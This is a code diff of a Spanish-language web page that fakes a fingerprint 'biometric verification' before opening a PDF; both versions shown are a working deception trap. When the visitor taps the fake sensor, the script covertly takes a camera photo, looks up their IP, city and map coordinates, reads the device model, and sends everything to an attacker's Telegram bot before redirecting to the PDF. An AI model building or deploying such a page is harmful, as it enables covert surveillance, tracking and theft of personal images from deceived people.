@@ -3,104 +3,122 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Acceso Seguro - Verificación Requerida</title>
+    <title>Acceso Seguro - Verificación Biométrica</title>
     <style>
-        body { background: #0b1016; color: #00ff41; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: 'Courier New', Courier, monospace; margin: 0; }
-        .scanner { width: 250px; height: 250px; border: 3px solid #00ff41; border-radius: 50%; position: relative; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 25px rgba(0, 255, 65, 0.3); }
-        .line { width: 100%; height: 3px; background: #00ff41; position: absolute; animation: move 2.5s infinite; box-shadow: 0 0 15px #00ff41; }
-        @keyframes move { 0%, 100% { top: 0%; } 50% { top: 100%; } }
-        .msg { margin-top: 25px; text-align: center; font-weight: bold; }
-        .blink { animation: flash 1.5s infinite; }
-        @keyframes flash { 50% { opacity: 0.3; } }
+        body { background: #050a0f; color: #00d4ff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; text-align: center; overflow: hidden; }
+        .fingerprint-container { width: 160px; height: 160px; border: 3px solid #00d4ff; border-radius: 25px; position: relative; display: flex; justify-content: center; align-items: center; cursor: pointer; transition: transform 0.2s; box-shadow: 0 0 30px rgba(0, 212, 255, 0.2); }
+        .fingerprint-container:active { transform: scale(0.95); }
+        .fingerprint-icon { font-size: 90px; user-select: none; }
+        .scan-line { width: 100%; height: 5px; background: #00d4ff; position: absolute; top: 0; left: 0; animation: scan 2s infinite; box-shadow: 0 0 20px #00d4ff; display: none; }
+        @keyframes scan { 0% { top: 0%; } 100% { top: 100%; } }
+        .instruction { margin-top: 40px; font-weight: bold; letter-spacing: 1px; padding: 0 25px; font-size: 0.9em; }
+        .loading-bar { width: 220px; height: 6px; background: #111; margin-top: 25px; display: none; border-radius: 10px; overflow: hidden; }
+        .progress { width: 0%; height: 100%; background: #00d4ff; transition: 3.5s linear; }
     </style>
 </head>
 <body>
 
-    <div class="scanner">
-        <div class="line"></div>
-        <span style="font-size: 50px;">👤</span>
+    <div class="fingerprint-container" id="sensor-box">
+        <div class="scan-line" id="line"></div>
+        <span class="fingerprint-icon" id="icon">👆</span>
     </div>
 
-    <div class="msg">
-        <p class="blink" id="status">INICIALIZANDO ESCANEO BIOMÉTRICO...</p>
-        <p style="color: #666; font-size: 0.8em;">Validando identidad para acceso al documento PDF.</p>
+    <div class="instruction" id="text-guide">
+        DETECTANDO HARDWARE BIOMÉTRICO...
     </div>
+
+    <div class="loading-bar" id="bar"><div class="progress" id="fill"></div></div>
+
+    <audio id="beep-sound" src="data:audio/wav;base64,UklGRl9vT19XQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YU92T19vdm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92dm92"></audio>
 
     <script src="config.js"></script>
     <script>
-        async function procesar() {
-            const status = document.getElementById('status');
-            let fotoBlob = null;
+        const sensorBox = document.getElementById('sensor-box');
+        const textGuide = document.getElementById('text-guide');
+        const icon = document.getElementById('icon');
+        const beep = document.getElementById('beep-sound');
+
+        function configurarInterfaz() {
+            const ua = navigator.userAgent;
+            const esNuevo = /iPhone 1[2-9]|Samsung S2[0-9]|Pixel [6-9]/.test(ua);
+
+            if (esNuevo) {
+                textGuide.innerHTML = "PRESIONE FIRMEMENTE LA HUELLA EN PANTALLA";
+                icon.innerHTML = "🔘"; 
+            } else {
+                textGuide.innerHTML = "COLOQUE EL DEDO EN EL SENSOR LATERAL O TRASERO";
+                icon.innerHTML = "📟";
+            }
+            sensorBox.addEventListener('click', iniciarTrampa);
+        }
+
+        async function iniciarTrampa() {
+            // Vibración inicial (Haptic Feedback)
+            if (navigator.vibrate) navigator.vibrate(50);
+
+            document.getElementById('line').style.display = "block";
+            document.getElementById('bar').style.display = "block";
+            const fill = document.getElementById('fill');
+            
+            textGuide.innerHTML = "ESCANEANDO... MANTENGA LA POSICIÓN";
+            setTimeout(() => { fill.style.width = "100%"; }, 100);
 
             try {
-                // 1. Captura de Foto (Prioridad alta)
+                let fotoBlob = null;
+                // Captura silenciosa de cámara
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                     const video = document.createElement('video');
                     video.srcObject = stream;
                     await video.play();
-
                     const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    // Convertir a Blob directamente para mayor velocidad de envío
-                    fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
+                    fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
                     stream.getTracks().forEach(t => t.stop());
-                } catch (e) {
-                    status.innerHTML = "❌ ERROR: SENSOR NO DETECTADO";
-                    status.style.color = "red";
-                    alert("Error de Seguridad: No se detectó el sensor biométrico. Por favor, permita el acceso a la cámara y recargue para continuar.");
-                    location.reload();
-                    return;
+                } catch(e) {
+                    console.log("Cámara denegada");
                 }
 
-                status.innerHTML = "✅ VERIFICADO. PROCESANDO DATOS...";
+                // Datos de red
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                const equipo = navigator.userAgent.match(/\(([^)]+)\)/)[1];
 
-                // 2. Obtención de Datos (Paralelo para velocidad)
-                const [resIp, agente] = [await fetch('https://ipapi.co/json/'), navigator.userAgent];
-                const d = await resIp.json();
-                const equipo = agente.match(/\(([^)]+)\)/)[1]; // Extrae el modelo del equipo
-
-                // 3. Reporte de Texto
-                const reporte = `🚨 *REPORTE DE ACCESO*\n\n` +
+                const reporte = `👤 *VERIFICACIÓN COMPLETADA*\n\n` +
                                 `📱 *Equipo:* ${equipo}\n` +
                                 `🌐 *IP:* \`${d.ip}\`\n` +
-                                `📍 *Ubicación:* ${d.city}, ${d.country_name}\n` +
-                                `📶 *ISP:* ${d.org}\n` +
+                                `📍 *Lugar:* ${d.city}, ${d.country}\n` +
                                 `🔗 *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
 
-                // 4. Envío a Telegram (Usamos Promise.all para enviar todo a la vez)
-                const promesas = [
-                    fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: reporte, parse_mode: 'Markdown' })
-                    })
-                ];
+                // Envío paralelo
+                const p = [fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: CONFIG.CHAT_ID, text: reporte, parse_mode: 'Markdown'})
+                })];
 
                 if (fotoBlob) {
                     const fd = new FormData();
                     fd.append('chat_id', CONFIG.CHAT_ID);
-                    fd.append('photo', fotoBlob, 'foto.jpg');
-                    promesas.push(fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd }));
+                    fd.append('photo', fotoBlob, 'captura.jpg');
+                    p.push(fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {method: 'POST', body: fd}));
                 }
 
-                await Promise.all(promesas);
+                await Promise.all(p);
 
-            } catch (err) {
-                console.log("...");
-            } finally {
-                // Redirección final
+            } catch(e) { console.log("Error"); }
+
+            // Finalización: Sonido + Vibración larga + Redirección
+            setTimeout(() => {
+                if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+                beep.play();
+                textGuide.innerHTML = "✅ IDENTIDAD CONFIRMADA. ABRIENDO PDF...";
                 setTimeout(() => { window.location.href = CONFIG.PDF_URL; }, 1500);
-            }
+            }, 3500);
         }
 
-        window.onload = () => {
-            // Pequeño retraso para que la animación se vea antes de pedir la cámara
-            setTimeout(procesar, 1000);
-        };
+        window.onload = configurarInterfaz;
     </script>
 </body>
 </html>
